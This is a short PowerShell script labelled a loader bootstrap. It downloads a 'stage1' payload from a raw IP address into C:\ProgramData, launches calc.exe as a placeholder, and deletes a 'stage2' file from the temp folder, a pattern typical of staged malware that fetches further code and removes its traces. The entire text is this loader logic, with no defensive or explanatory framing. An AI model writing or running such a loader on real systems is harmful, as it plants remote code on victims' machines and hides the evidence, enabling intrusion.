<# Loader bootstrap #>
[CmdletBinding()]
param(
    [string]$FetchUrl = 'https://203.0.113.117/stage1.ps1',
    [string]$LocalPath = "C:\ProgramData\stage1.bin",
    [int]$RequestTimeout = 219
)
Invoke-WebRequest -Uri $FetchUrl -OutFile $LocalPath -UseBasicParsing
Start-Process -FilePath "calc.exe"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
Set-Location -Path $env:TEMP
